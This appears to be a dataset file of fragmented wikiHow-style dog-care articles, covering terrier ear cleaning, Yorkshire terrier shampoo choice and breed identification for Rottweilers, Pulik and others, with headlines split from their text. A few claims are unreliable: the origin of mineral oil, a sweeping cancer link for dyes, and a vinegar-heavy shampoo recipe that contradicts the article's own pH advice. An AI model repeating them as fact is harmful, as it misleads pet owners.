Get the dog ready.",How to Clean a Terrier's Ears1," There are certain cleaners you should use to treat your dog's ear. Any you buy should be made specifically as an ear cleaner that is safe for dogs. Look for products that have ingredients that will clean off dead cells and ceruminolytic properties, which help break up earwax.They should also be mildly acidic to help kill bacteria and be able to evaporate quickly.
Your vet may also be able to give you a good cleaner.;
, There are multiple kinds of cleaners, but some are better than others. Liquid cleaners are better than cleaner wipes. Wipes can only reach certain parts of your dog's ears, where liquid cleaners can reach all parts of the ears. Ear wipes also cannot reach your terrier's ear canals, which is where most ear infections start.


This is why you need liquid cleaners that evaporate quickly.
Witch hazel-based ear cleaners are one of the most common because they dry quickly. You can find them in most pet stores., Even though water helps clean the rest of your dog, it should not be used in the ears. Unlike cleaner, water is hard to remove after it gets into your terrier's ear and the stagnant water left in the canal can cause it to swell.


This side effect creates a breeding ground for infections, since water doesn't evaporate as quickly as liquid cleaners., When you are about to clean your terrier's ears, ask a friend or loved one to help. Your dog may move around and you need both hands to clean the ears. Place your dog on a soft, high surface, such as a table covered with a towel, so your terrier will be comfortable while you're cleaning his ears.It may be necessary to trim the fur in your pet's ears if you haven't recently. If you keep your terrier's coat regularly trimmed, this may not be needed. However, if you do not, terrier's ears are often very furry, so you may need to trim the fur around the inside. This will also help cut down on trash and dirt in his ear as well. Use small manicure scissors to trim the fur in your pet's ears.Also have some disposable gloves for your hands and two cotton balls nearby.

Consult your vet.,
Do not use human shampoo.,
Consider the length of your dog’s hair.",How to Choose a Shampoo for a Yorkshire Terrier1," A Yorkshire terrier’s coat is different from most dogs. While most dogs have double coats, and either cottony or wiry hair, Yorkshire terriers tend to have a single coat with human-like hair. Yorkshire terriers also have very sensitive skin.Before buying a shampoo, ask your vet for recommendations to ensure that you are selecting a shampoo that will meet your yorkie’s needs.;
, It is recommended that you never use human shampoo to clean your dog’s hair. Human shampoos are formulated for human hair and skin. Human hair and skin have a lower pH balance, i.e., are more acidic. In comparison, dog hair and skin have a higher pH, i.e., are more alkaline.


By using human shampoo, you are disrupting your dog’s pH balance. This can lead to or exacerbate skin and hair problems.Choose a dog shampoo that has a pH in the neutral range, for example, 7 or higher. Some shampoos list the pH level on their shampoo. If they do not, it should clearly state that the shampoo is pH-balanced for dogs., While some Yorkshire terriers tend to have long, silky human-like hair, other yorkies can have short, cottony or wiry coats. Therefore, select a shampoo based on the length of your yorkie’s hair.If your yorkie has long hair, choose a shampoo for dogs with medium to long hair.
If your yorkie has shorter hair, choose a shampoo for dogs with short, cottony or wiry coats.

Pour the liquid into the ear.,
Plug your dog's ear.,
Massage the ear canal.,
Dry up the cleaner.",How to Clean a Terrier's Ears2," Start by warming the liquid cleaner slightly. You can move the bottle back and forth in your hands or place it in a warm place. Next, hold your hand around your dog's ear and place the nozzle of the bottle above it, just over the ear entrance. Gently squeeze the fluid into the ear, pouring enough liquid in to fill the canal.


If you overfill the canal, it won't hurt your dog. It will just spill out onto the floor., Once the ear is full, use one of the cotton balls to plug the entrance. This will help keep the cleaner in during the next step. It should fit down into the ear canal.


Don't push it too far down. You don't want to hurt your dog.Do not use a Q-tip. Dogs have a tendency to move suddenly, which could cause the q-tip to plunge into her ear and cause pain and structural damage., Once the cotton ball is in place, gently rub the bottom of your terrier's ear canal for a minute or two. This will help mix the cleaner with the wax and debris in your terrier's ear canal. The ear canal is the area right under the ear flap. It will feel like a small tube underneath your fingertips.


The exact location doesn't matter as long as you are in the general area., After the ear massage, remove the cotton ball from the ear. Your dog will likely shake her head at this point to get the remaining cleaner out. Once she does, use another cotton ball the gently blot out excess cleaner. Try massaging the ear canal to bring any remaining cleaner to the surface. Your dog will likely shake her head a few times, which is normal.


Look the other direction when she does this. The cleaner may fly out of his ear.
Once she's done shaking her head, repeat on the other ear.
If any discharge you find smells bad, you notice a heavy discharge, or the color is brown or black, take your dog to the vet. "

Determine how often to clean your dog's ears.,
Avoid cleaning the ears under certain situations.,
Notice other issues that need vet assistance.",How to Clean a Terrier's Ears3," There are many factors that go into deciding how often to clean your dog's ears. There is no specific rule for how often you should do this. This can range from once a week to once a month.This timeline depends on the amount of ear wax produced by your dog, any predisposition to ear infection, or your dog's general lifestyle.


For example, if your dog has a history of ear infections and has a fast production of thick black wax, he would benefit from cleaning once a week. If not, the built up wax could fester ear mites or harmful bacteria. Reducing the amount wax weekly could help decrease the breeding ground for infection.
However, if you dog has never had ear infections but still produces a lot of wax, he would be okay with ear cleanings once a month.
If you aren't sure, ask your vet for the advice about how often you should clean your dog's ears. You don't want to over clean them, which can cause problems., There are some behaviors that signal a larger issue for your dog than a need for ear cleaning. If your dog tilts his head to the side constantly or permanently to one side, avoid cleaning his ears and see your vet. Additionally, if your dog develops a head tilt after you clean his ears, seek veterinary attention before cleaning his ears again.


These symptoms are signs of ear pain or possibly a ruptured eardrum, both of which need immediate treatment. If the eardrum is ruptured, cleaning can make it worse., There are other ear conditions that might signal another issue with your dog. If you notice your dog scratching or tearing at her ears, have her ears checked by your vet before doing anything else to her ears.


These symptoms signal the possibility of a foreign object or body stuck in your dog's ear. If this is the case, your vet may need to examine her with an otoscope to check for issues."

Pick a gentle shampoo.,
Try an oatmeal shampoo.,
Choose shampoos that are fragrance free.",How to Choose a Shampoo for a Yorkshire Terrier2," Choose a safe, all-natural shampoo for your dog. These shampoos tend to have gentle ingredients that will not aggravate your yorkie’s skin. Pick shampoos that contain ingredients such as certified organic coconut oil, Vitamin E, aloe vera, rosemary extract, tea tree oil, peppermint oil, and other natural oils.Try to avoid shampoos that contain mineral oil. Mineral oil is made from crude oil, which is a by-product of distilled gasoline., If your yorkie itches due to dry skin and/or allergies, try an oatmeal shampoo. The soothing qualities associated with oatmeal will remedy itchy skin due to dry weather or allergies., Shampoos that have fragrances and phthalates can irritate and dry out your dog’s skin and hair. Therefore, choose shampoos that are fragrance-free and hypoallergenic.Instead, choose shampoos that have natural oils, such as lavender oil, sage oil, or eucalyptus oil, to add a scent to your dog’s hair.

Be aware of “natural” shampoos.,
Avoid shampoos with artificial colors.,
Stay away from shampoos with harmful chemicals.,
Make a homemade shampoo.",How to Choose a Shampoo for a Yorkshire Terrier3," Similar to packaged food that is labeled “natural,” shampoos that are labeled “natural” can still contain ingredients that will irritate your yorkie’s skin and hair. Shampoos that are promoted as natural often list “coconut base” as their first ingredient. But not all coconut bases are created equal.For example, the ingredients cocamidopropyl betaine and cocamide DEA/MEA are derived from coconut oil. However, they have been chemically altered to the point where they are environmental toxins that affect the immune system and disrupt hormones., Many dog shampoos that claim to be “herbal” contain artificial colors. Artificial colors can be very harmful. Artificial colors are associated with many forms of cancer, and should be avoided.Examples of artificial colors are Yellow 5, D&C, FD&C, and others.

, Try to avoid shampoos that contain ingredients such as sulfates, formaldehyde, isopropyl alcohol, parabens, methylchloroisothiazolinone, polysorbates, polyethylene glycol, and propylene glycol.Many of these ingredients are by products that can irritate and disrupt the pH balance of the skin and fur, or cause serious illnesses and diseases in dogs.

, A great way to avoid shampoos containing harmful ingredients is to make a homemade shampoo for your dog. When making the shampoo, look for alkaline ingredients, i.e., ingredients with a pH of 7 or higher. Most soaps and soap bases have their pH level listed on the packaging. Here is a simple recipe for a safe and all-natural dog shampoo:In a large container, mix two cups of apple-cider vinegar, two cups of a natural or organic dish soap with a pH of 7 to 8, and four cups of water.Then, add four ounces of vegetable glycerin. Mix and shake well. Shake again before each use.
Avoid dish soaps with strong scents and additives. Choose an all-natural, organic dish soap with simple ingredients.
When making a shampoo for your dog, be sure to balance acidic substances (like vinegar) with alkaline substances (like baking soda) in a neutral base (like water). Shampoos that are too alkaline will not be a problem. However, shampoos that are too acidic can cause skin problems.

Look for high energy.,
Pay attention to herding behavior.,
Assess whether the dog has high intelligence.",How to Identify an Australian Shepherd," The Aussie's body is slighter longer than it is tall. They stand about 20-23 inches tall at the shoulders for males, and about 18-21 inches tall at the shoulders for females.The Aussie has a sturdy build that is solid but well balanced.;
, The Aussie has a signature coat. It typically consists of medium length fur that is relatively smooth and thick. This fur is especially pronounced at the back of the legs, where it is typically feathered.The coat is also water-resistant, which helps the Aussie work all day in the outdoors, rain or shine.

, The Aussie is a multi-colored dog that usually has exciting and dynamic color combinations. The American Kennel Club (AKC) recognizes four different coat colors: black, blue merle, red, or red merle. ""Merle"" refers to a ""marbling"" of colors that has a mixture of colored and silver fur.The AKC also recognizes three distinct markings, which can be added to any of the coat colors. These include tan points, white markings, or a combination of both.

, The Aussie's hind legs generally extend just a little behind its body, so it should not give the impression of being squared off like a table. However, it does have a flat back and a strong neck, which give it a strong appearance.The front legs should seem to be set back from the front of the dog's body, as the chest of the Aussie puffs out.

, An Aussie's head should look in proportion to the size of its body. The dog's muzzle should have a slightly protruding look and should be a little less than half the length of the skull., The Aussie has ears that are connected high on its head. They are folded down but they do not look floppy. Instead, they are triangular, with rounded points, and are stiff in appearance. Overall, they should reach down to, or slightly past, the pivot area of the lower jaw.


There is some debate about whether a Aussie should have folded or upright ears. While show dogs are required to have folded ears, there are many purebred dogs that have upright, or pricked, ears., Not all Aussies have multi-colored eyes but many do. If the dog has two colors in the same eye or a different color in each eye, this condition is called heterochromia. Aussies can have a mix of any colors, including brown, yellow, green, orange, and blue. However, brown is dominant, so most likely.Any combination of colors, whether solid or marbled, is acceptable for show dogs.
Even with marbled colors in their eyes, the pupils of an Aussie should be clearly differentiated from the iris.

, Most Aussies have a naturally bobbed tail. However, breeders will dock the tail to about 4 inches long if it is longer than average.If the tail is present, it should arc slightly upwards when the dog is holding it upright.The tail can be described as bushy. It is normally about level to the head when the dog holds both upwards.
Tail docking is cosmetic. It is not needed for the health or wellness of the dog. Some breeders may decide not to dock the tails of the dogs.

, They should be oval and densely compact. Aussies have somewhat large feet, with thick pads and arched toes that should be resilient to the environment around them., Australian shepherds are known to be high energy dogs. This is because they were originally bred to herd sheep in difficult terrain. If you are just keeping an Australian shepherd as a pet and not as a work dog, you will need to give them need lots of exercise to keep them happy and healthy. If your dog has lots of energy and can keep up with vigorous activity, then you may have an Aussie.


This high energy can translate into having a love of being involved in a wide variety of activities, such as training sessions, hiking, running errands, or playing in a park.

, Aussies are working dogs that love to have a job, such as other herding animals do. They will stay by your side and will eagerly respond to commands you give them.If you don't have other animals for the Aussie to herd, it may try to herd you or other people it comes into contact with. You should train them not to do this.

, Australian shepherds are highly intelligent dogs that can learn most commands very quickly. Because of this, they are typically easily housebroken and taught house rules.This means that you can teach your dog to follow a wide variety of commands and you can do all kinds of activities with it, such as obstacle courses or fetching games.

The mustache consists of a much longer and thicker coat of fur than is present on the rest of the head. This unusual feature is one of the easiest ways to recognize an Affenpinscher.;
, The Affenpinscher's face is rounded and flat. The snout should be short and pushed in like that of a pug. Many people say that it looks like a monkey.

, An Affenpinscher's ears vary somewhat, but they are generally short and stand up straight. They should not be long or flop down along the side of its head.

, An Affenpinscher's eyes should be round and dark. Its eye rims should be black.

, The Affenpinscher should have an undershot bite, which means that the lower jaw protrudes out past the upper jaw. The dog should have a prominent, black lower lip that covers the tongue and teeth. The teeth should be straight and even., Like most terriers, the Affenpinscher has wiry fur. It is harsh to the touch, dense, and about 1 inch (2.54 cm) long. The fur should be slightly longer and less rough around the head, chest, stomach, and legs., The Affenpinscher is typically 10-15 inches (25.4-38.1 cm) tall. It generally weighs 7-8 lbs (around 3 kg). Unlike some other small dogs, though, the Affenpinscher’s body is proportional. Its head and legs look neither abnormally small or large for its body.

, Despite its size, the Affenpinscher is intimidated by no one. It is very willful, stubborn, and unlikely to back down. Although it can be trained, it is far less amenable to training than some other breeds., The Affenpinscher is generally known to be playful. It even seems sometimes, to be mischievous and funny--an extension, perhaps, of its unruly behavior. Although it likes to cause trouble, it is not generally aggressive., The Affenpinscher is a bad boy with a heart of gold. Though it likes to cause trouble, it is generally quite loving and takes to its owners. It will frequently seek attention and affection., Pure-bred dogs should have a pedigree which records the dog’s family for at least four generations.

Verify that the space is clean and comfortable. The breeder should also be able to provide veterinary records for the mother and any care the puppies may have received.Reputable breeders do not sell all breeds and cannot provide dogs on demand. They typically require that you put your name on a wait list. They specialize in a couple of breeds. Ideally, they can prove that they are involved in clubs and have won awards for those specific breeds.

, Most veterinarians should be familiar enough with dog breeds to be able to tell you if yours is a purebred Affenpinscher. If it is a mixed-breed dog, however, they might have more difficulty saying with certainty if it is part Affenpinscher.

, Several companies offer DNA tests that can determine the breed of your dog. They might not be perfect when determining the various stands in a mixed-breed dog. However, they should be able to determine if your dog is exclusively or predominately an Affenpinscher.Not all breed tests are created equal. Some companies spend more time on research and quality control than others. Before purchasing a test, do your research and choose a company you trust. You may consider discussing the topic with your veterinarian.The DNA test can be purchased online. A kit will be sent to your house with instructions on to collect the DNA."

It also has a top-knot: a growth of long hair that flows down from its head. The dog can be any color and still meet breed standards.


The fur is often described as having a texture similar to that of human hair.The Afghan’s hair is short from the ribs up to the back. Thus, the fur will be much closer to the dog’s body along its back than other areas.;
, The Afghan Hound has long legs, a long neck, and a standard length for a large dog. Afghans should stand approximately two feet tall and weigh fifty to sixty pounds., The head is long and thin, like a skinny prism. The nose protrudes and it should point slightly downwards when the Afghan Hound is looking straight ahead. The ears are big and floppy.

, One feature of Afghan Hounds that is rare among other breeds, is the way the teeth of their upper and lower jaw match evenly, instead of meeting in either an underbite or an overbite. Though, some Afghans have a scissors bite, in which the lower teeth rest against the back of the top teeth., The eyes of an Afghan Hound should never be big. Instead they should be almond-shaped: thin with clearly defined points on both ends. The eyes should be a dark color., Unlike most of the Afghan’s body, its tail should have short hair. The tail is relatively short and curves upward at the end, creating a semi-circle., As puppies, Afghan Hounds are oftentimes social and affectionate. This, however, will change as they get older. A mature Afghan Hound will want little attention, even from family, and will generally be entirely indifferent to new people., The Afghan Hound can be hard to train. Because they are independent, they can be stubborn and resistant to taking commands. With perseverance you can train them. However, expect them to be slow to adapt to even basic rules, like house training., The Afghan Hound has strong hunter instincts. In practice, that means that it likes to chase smaller animals. If you can't get your dog to stop chasing the neighbor's cat, it might be an Afghan Hound., Reputable breeders selling pure-bred dogs should be able to show you a pedigree, a document that records four or more generations in the dog’s family line, possibly including physical features and awards. A good breeder should know the pedigree of the dog by heart and be willing to show it to you upon demand.To find a reputable breeder, ask a veterinarian that you trust for recommendations.A reputable breeder should allow you to visit to see where their dogs are raised. The dogs should have adequate space and the area should be clean.Reputable breeders should specialize in one or two breeds and might be involved in clubs dedicated to the breeds or have won awards associated with them. They will probably not be able to provide dogs on demand; you will need to sign up for a wait list.

, There are several companies now that perform DNA tests to verify dog breeds. The tests might not be perfectly precise, but they should be able to prove if your dog is predominately an Afghan Hound.These tests are administered at home. You can order them online, perform the test, and then send it back through the mail., Veterinarians are generally good at determining the breed of a dog. If you are unsure if your dog is an Afghan Hound, ask your veterinarian’s opinion.

Look at the conformation.,
Look at the head.,
Notice their jaw strength.,
Recognize deviations among individuals.,
Notice common personality traits.",How to Identify a Rottweiler1," Conformation means the physical appearance of the dog. Rottweilers have an overall stocky look, with a wide chest, long back, and thick legs. Typically they range from 2 to 2 1⁄2 feet (0.6 to 0.8 m) tall at the shoulder, though it is not uncommon for them to be even taller. Rottweilers are powerful, muscular dogs, and the overall shape of the animal should invoke a feeling of strength and agility.They have large, heavy paws with high knuckles, and are never flat-footed.
Their legs are straight, not bowed outwards, and typically stand such that their shoulders are even with or slightly higher than their hindquarters.
Their necks are thick, nearly the same diameter around as their heads.
The tail is usually docked, (cut short,) but not always, so the presence of a long tail cannot automatically disqualify a Rottweiler from being a pure-bred Rottweiler.;
, Their heads are very boxy, being about the same height as width, and only slightly longer from nose to the back of the head. Rottweilers can have a slight wrinkling effect around the eyes, but this should not be too pronounced.The ears of a Rottweiler will always fold down with a triangular shape, not unlike a Labrador Retriever, and will never stand upright like a German Shepherd Dog or hang like a Basset Hound.

, It is also important to note that, of the recognized breeds, Rottweilers are typically credited as having the second strongest bite pressure, behind only the pit bull, when measured in pounds per square inch. To this end, the jaws are robust and heavy, and the head wide in order to accommodate the large muscles needed to achieve this kind of strength.Rottweilers will never have underbites like English Bulldogs.

, Not every Rottweiler is a perfect specimen. Some may be stockier, longer, taller, leaner, or otherwise different than others of the same breed. Remember that while breed types are usually pretty all-inclusive, it is possible to have small variations, especially those that are environmental in nature, within the same breed.It is also important to consider that, like people, some Rottweilers are overweight, and will resemble more of a barrel shape than a tapered athlete. This does not mean the dog is not a Rottweiler, just that it has been spoiled with food.

, Rottweilers were initially bred for work as protectors and guardians. This means they can be quite dominant, and even aggressive on occasion. Rottweilers are intelligent and active dogs who enjoy playing and completing tasks.Rottweilers can be very gentle and loving dogs, but they require a lot of training and guidance from an early age.
Without proper training as a puppy, Rottweilers can become destructive pets who bark constantly and chew up your furniture or dig in the yard.

Look at the coloring.,
Notice the variations in the markings.,
Acknowledge rare colorations.",How to Identify a Rottweiler2," All Rottweilers have a black base coat on their bodies with distinctive brown markings on their chests, legs, and face. The brown can be a range of colors from a dark mahogany to a red or rusty color, but the black will always be black, never grey or merle, (a mix of colors.) The brown is typically isolated to the dog's paws, the insides of its legs, its chest, its throat and muzzle, and two distinct dots above the eyes.This pattern is so unique to the breed that it is simply called ""Rottweiler color,"" even when found on mixed breed dogs.
The only other breed to have this coloration naturally is the Doberman Pinscher, which also originated in Germany, but the Doberman Pinscher is very lean, long, and tall, as it was bred for running more than for fighting and intimidation.

, The actual size and shape of the markings may vary between individual dogs. For example, some dogs may have an upside-down wishbone-shaped brown mark on their chests, while others may have a butterfly shape, two separate dots on each pectoral, (chest muscle,) or just a shapeless smudge. The important thing to remember is the overall positioning of the markings.Some dogs may also have white markings on them. This is considered a fault by the breed standards, but nonetheless some purebred Rottweilers may have white on the chest, between the shoulders, or on the face or paws.
Sometimes older dogs will develop white in these areas as well. In these cases, the white is not a fault, but simply an effect of aging. The white on older Rottweilers will typically look more grizzled than pure white, however.

, Rarely, Rottweilers can be born albino, all red, or with a ""bluish"" color. These are considered breed faults, but are not predictable. Albino Rottweilers are all white with pink skin and red eyes, but otherwise conform to the breed's physical characteristics. Keep in mind that these are rare mutations, and a red or blue Rottweiler is most likely a mix.A red Rottweiler conforms to all the breed's physical standards, but is all brown or red instead of having the typical black and red coloration.
A Rottweiler is said to be ""blue"" when the guard hairs of the coat are a lighter color than the undercoat, resulting in an overall bleaching effect that washes out the entire color.

Look at the fur.,
Weigh the dog.,
Measure the dog’s height.,
Look at the tail.,
Observe the build of the dog.,
Observe the dog’s behavior.",How to Identify a Maremma Sheepdog1," The Maremma sheepdog has white or cream colored fur. Shades of orange or yellow might also be present.If your dog has brown, black, or spotted fur, however, it is not a Maremma.The Maremma’s coat should be long and plentiful. It might feel rough to the touch. It should be a bit wavy but not curly.The fur on the muzzle, head, ears, and feet will be shorter than on the rest of the body. On limbs, likewise, the hair will be relatively short on the front side, but will be a bit longer on the back side.
The Maremma sheepdog’s billowing fur makes it poorly adapted to heat.;
, The Maremma sheepdog typically weighs between 70 and 100 pounds. If your dog weighs less than 70 pounds, it might not be a Maremma sheepdog, or it might just be a puppy.Bitches average 66 to 88 pounds.Male dogs average 77 to 99 pounds.

, Maremma sheepdogs stand 25 to 30 inches tall. Of course, it’s possible that you have a jumbo Maremma, in which case it might stand 31 or even 32 inches tall. But if your dog is significantly taller or shorter than the 25 to 30-inch range, it is likely not a Maremma., A Maremma’s tail is set low and droops to below the joint of the hock (that is, the point of reverse articulation in the hind legs). When the dog is quiet, the tail will hang dow. If the dog is excited or alert, it will point straight out, its tip curved upward slightly. The tail will be covered with hair just like the rest of the animal., Maremma sheepdogs have a supple and sturdy build. The body should be muscular and well-developed. The shoulders should be broad and straight. The body should rise slightly toward the loins before falling toward a strong rump.The body should be a bit longer than the dog’s height as measured from the ground to the dog’s shoulder.

, Maremma sheepdogs are brave but not aggressive unless provoked.They demonstrate intelligence, and so can easily learn tricks and commands. Overall, they are a lively and hardy breed with an air of majesty about them.If the Maremma does not have a flock to guard, they will gradually become more possessive of their owners, more defensive of their possessions (toys, beds, and so on), and more territorial.Maremma sheepdogs are aware of their surroundings, but to the untrained eye, their natural attentiveness might be mistaken for nervousness.
Generally the Maremma is docile, as they are bred to be so.Maremmas need space to run and play.

"
Check the dog's weight.,
Look for a well-proportioned, medium-sized dog.,
Check for a distinctly red coat.,
Look at the forequarters and the hindquarters.",How to Identify a Welsh Springer Spaniel1," Welsh springer spaniels are medium to small dogs. Sizes vary within the breed but they should be between 35 to 55 pounds. Keep in mind that males are larger than females, so males should be between 45 and 55 pounds and females should be between 35 and 45 pounds.Welsh springer spaniels are usually slightly smaller than English springer spaniels.;
, While the Welsh springer spaniel is of medium size, its build is well-proportioned to that size. It is ideally 17 to 19 inches tall at the withers, which is located at the ridge behind the shoulders of an animal. Its body shape is rectangular, with the height being similar to the length of the body.Overall, the dog should give the impression of being long and lean, clearly being built for hard work and exercise.

, Welsh springer spaniels are a rich shade of red and white. In addition to being a beautiful color, the dog's coat is waterproof, weatherproof, and thornproof.The coat is flat and soft to the touch, and straight instead of wavy.

, In addition to its general physical size and shape, there are some physical characteristics that are distinct to the Welsh springer spaniel. In particular, the forequarters and the hindquarters and well proportioned and defined.The forequarters: The Welsh springer spaniel's forearms are approximately the same length as the dog's shoulder blade.
The hindquarters: The hind legs and thighs of the Welsh springer spaniel should be well defined and strong. They should be perpendicular to the ground when viewed from the side or the back.

Look for the Rottweiler traits.,
Notice the dog’s coat.,
Look at the stance.,
Rule out mixed breeds with proper documentation.",How to Identify a Rottweiler3," Just because a dog has the Rottweiler color and a stocky build does not make it a Rottweiler. Other breeds, such as the English Mastiff, American Mastiff, Bull Mastiff, or Pit Bull can resemble a Rottweiler, and can produce offspring that may look similar to a purebred Rottweiler. Mixed breeds typically have either the conformation of a Rottweiler or the Rottweiler color, but rarely both.A mastiff mix with a Rottweiler will often have jowls or cheeks that hang below its chin when the mouth is closed, and will have excess skin and wrinkling around the face and head.

, Mixed breeds will often have a longer coat than the short hair of a purebred Rottweiler. Other mixes will produce longer hair than a purebred; one of the most common mixes is Rottweiler with German Shepherd, which sometimes results in a dog with the color and size of a Rottweiler, but the furriness and tail of a German Shepherd.A lean dog with a long, thin muzzle and Rottweiler coloring may be mixed with a Labrador Retriever or Doberman Pinscher.

, Because of their athleticism and bite strength, Rottweilers are often crossed with Pit Bulls for the purposes of dog fighting. These crosses are typically smaller than purebred Rottweilers, and have a wider, almost bulldog-like stance.


Also, a Rottweiler with a curly tail will always be a mix of some kind., In order to be certain that you have a purebred Rottweiler and not, in fact, a mixed breed dog, you should try to acquire some breed registration paperwork. Most purebred dogs have paperwork that accompanies them when they are given to their owners from the breeder.The paperwork will most likely come from the American Kennel Club (AKC) or the United Kennel Club (UKC), the two largest registration organizations in the United States for purebred dogs.

Check the eyes.,
Look at the head and skull.,
Check the mouth.",How to Identify a Maremma Sheepdog2," Maremma sheepdogs have bold eyes situated in an almond-shaped aperture. The eye-rims are black and the eyes are dark in color. The eyes are neither too large nor too small. The zone beneath the eyes is gently chiseled., When a Maremma sheepdog is viewed from the front, the head should assume a triangular shape, and be proportional relative to the body. It should be neither too large nor too small. It should be rounded, with the occipital ridge (the ridge that encloses the back of the skull) slightly raised.The muzzle should not be longer than the length of the skull.
The ears atop the head should be floppy.The neck should be strong, and of medium length.

, The dog’s mouth should contain white teeth. The teeth should be strong and spaced at regular intervals in two even rows. The upper incisors should close neatly over the lower incisors."
"
Look at the forequarters.,
Look at the hindquarters.,
Observe the dog’s movements.",How to Identify a Maremma Sheepdog3," The forequarters include the front legs and chest. The shoulders should be sloping and well-muscled. The forelegs should be muscular and well-boned without appearing heavy. The pasterns (the sloping part of the dog’s foot between the leg and edge of the toes) should have a low angle when viewed in profile., The hindquarters include the rear legs and rump. The rear legs should be muscular and strong. The legs should be equal in length and appear straight when viewed from behind. The hock (the joint from which the rear legs reverse articulate) should have a moderate bend in it., When the Maremma moves, it does so without hesitation. The standard Maremma gait is an extended trot.Maremmas are nimble and can turn quickly."
"
Look for a well-proportioned head shape.,
Look for definition below the eyes.,
Assess the dog's neck.",How to Identify a Welsh Springer Spaniel2," The Welsh springer spaniel's head is well proportioned to its body. It is not overly wide but also not skinny. This well-proportioned nature extends to the muzzle, which should not be overly long but should not be stubby.The dog's muzzle should be the same length, but never longer than, the length of the skull.

, The Welsh springer spaniel face and muzzle are well defined below the eyes. This means that they are well-chiseled and tight-skinned on their faces.Above the eyes the dog's skin is a little looser. This can be seen in the dog's eyebrow region, which gives it a nice facial expression.
Most often the Welsh springer spaniel has brown eyes.

, The Welsh springer spaniel's neck is relatively long for its size. However, the neck is only slightly curved and connects into the shoulders cleanly.It should have skin on the neck that is clean and not droopy but not overly tight.

"
"
Look for interest in people.,
Pay attention to the dog's good ability to hunt and swim.,
Notice a high level of intelligence and interest in training.",How to Identify a Welsh Springer Spaniel3," Welsh springer spaniels are friendly dogs that like to be around humans. They are loyal and affectionate with their family members, preferring to spend time with those that they love.This breed of dog may be reserved with strangers but it is not usually aggressive or overly shy when meeting new people.
The Welsh springer spaniel is sometimes referred to as a ""velcro"" dog because it will follow you around closely., Welsh springer spaniels are known to be great hunters and they are especially adept at swimming and retrieving game. This is in part due to their partially webbed feet.If you are not a hunter, try playing fetch with your dog in the water. See if the dog enjoys the activity and whether it is an adept swimmer.

, Welsh springer spaniels are known for being very smart and great at training. This comes in very handy when they are used as hunting and birding dogs but it also means they are good at being trained to do behave and complete tasks, such as completing obstacle courses.Welsh springer spaniels are great retrievers, so they can be easily trained to chase and return balls or other dog toys.

Look at the hair.,
Notice the size.,
Examine its eyes.,
Inspect the nose.,
Notice the ears.,
Look for loyalty.,
Monitor the dog’s agility.,
Watch for a high prey drive.,
Separate the cords.,
Bathe an Puli.,
Wring out the cords.",How to Identify a Puli," The Puli is the best known for its hair, which consists of wooly curls that almost look like human hair. The coat is dense and mostly weather resistant, as they were once used to herd cattle. The hair will grow all the way to the ground. The coat should be either black, silver, or white, though black is definitely the most common color for the breed.The coat will always be coarse, wooly, or wavy – never silky.
Pulik typically do not shed very much.
The hair will naturally clump together over time, creating a corded appearance in adults – similar to human dreadlocks.;
, The Puli is always described as compact. They stand 15-18 inches at the shoulder for males, 13-17 inches for females. They are noticeably longer than taller, and their head gives them almost 1/3 more height in addition to their body.Pulik are classified as medium sized dogs. They typically weigh between 25 and 35 pounds.

, The Puli's eyes are almost never seen since the amount of hair will cover it. The almond-shaped eyes are deep-set in the Puli’s head. The eyes themselves will always be dark colored.You can trim the hair on the Puli’s face to make the eyes more visible.

, The Puli’s muzzle should barely protrude past the hair, and its nose should just barely be visible. The hair grows from the bridge of the dog’s muzzle, down over the sides.The nose is always black, without exception.

, There may be a slight indentation of the ears, but the hair of the Puli covers almost everything. You will have to push the hair aside for there to be any visibility of the ear.The ears are medium-sized and V-shaped.

, Pulik are very loyal. Once they bond, that bond will remain intact for a long time. Their intelligence, combined with their loyalty, will give them an elevated interest in brain games – especially when engaging in these games with their owner. Because of their loyal connections to their owners, these dogs should be easily trainable.Pulik typically behave very well around kids, and most of the Pulik should not have a problem being left at home.
While quite mischievous and demanding at times, the Puli’s loyalty makes them a great pet.

, Since Pulik were originally bred as herding dogs, they are naturally quite agile. Despite their seemingly cumbersome coat, these dogs are quick on their feet and can move at impressive speeds. They also have extremely quick reflexes.A Puli should be able to run quickly and chase after objects during games (like fetch). Pulik have a pretty high level of energy and need regular exercise.

, Because of their breeding origins, Pulik have a high prey drive. This means that they are very likely to chase after smaller animals or objects that they have mistaken for small prey.Pulik usually get along well with other household pets. But sometimes, their prey drive causes them to act aggressively toward other animals, especially ones smaller than themselves.
Pulik are traditionally very high energy dogs. This stems from their breeding as herding dogs who were used in an active outdoor role for long hours of work.

, For adult Pulik, you’ll need to separate each cord into individual tendrils before bathing. Use your fingers to work through the cords, beginning at the bottom. Work your fingers all the way up to the top of the cord where it intersects with the skin.Do not use a brush on your Puli’s coat. This could do serious damage to their coat and hurt their skin over time.

, Puli adults should be bathed very infrequently. In fact, you may only want to bathe them regularly if you are showing them professionally in dog shows – otherwise, four or five times per year will suffice. But if you must bathe your Puli, be sure to wet it down with water first. Then apply some gentle dog shampoo to the tendrils and rinse them out.Make sure you use plenty of water and rinse thoroughly.
It is also a good idea to dilute the dog shampoo before using to protect your Puli’s sensitive skin.
Pulik, in general, should not be bathed very often because their dense coat takes so often to dry and this can lead to skin irritations and dermatitis. Before 8-10 months, though, you can feel free to bathe your Puli puppy as needed – about once every three weeks or so., Use both hands to gently wring out the excess water from the cords. Take a few cords in your hands at a time and squeeze it gently, beginning at the top and working your way down to the bottom.Once you have finished wringing out the cords, you should repeat the process of separating the cords into tendrils with your fingers. Then let the dog air dry its coat the rest of the way.

Pet the wiry coat.",How to Identify a Norwich Terrier," The Norwich Terrier is a stocky breed, with a fox-type expression. They should be no more than 10 inches at the top of the shoulders, and the distance from the shoulders to the point of the rear should be about the same as the height. This is what gives the breed a square look. These dogs weigh around 12 pounds.
, The small dark eyes are oval shaped and should be far apart. The medium sized ears stand up and are like the eyes: they should be far apart. The muzzle is strong and shaped like a wedge. The fully pigmented nose and lips are black., The moderately short body is compact and deep with a wide chest. The legs are made for digging and are short and powerful. The rear thighs are muscular and lead to low hocks. Front and rear feet are rounded and have thick pads. The tail should be just long enough to grab, and it is carried straight up., It should be a hard, straight coat and covers the undercoat. There is a protective mane around the neck and shoulders. Remember - it can be any shade of red, wheat, grizzle or black and tan... but there should be no white markings!"

Consider DNA testing.",How to Identify a Sussex Spaniel," Looking at facial expression of the Sussex spaniel is important for identifying the breed. Overall, the dog has a somber and serious expression, although this does not express its actual personality. It has heavy eyebrows, which are the key feature that creates this frowning expression.The dog's eyes are large and hazel colored, with a soft and passive expression.;
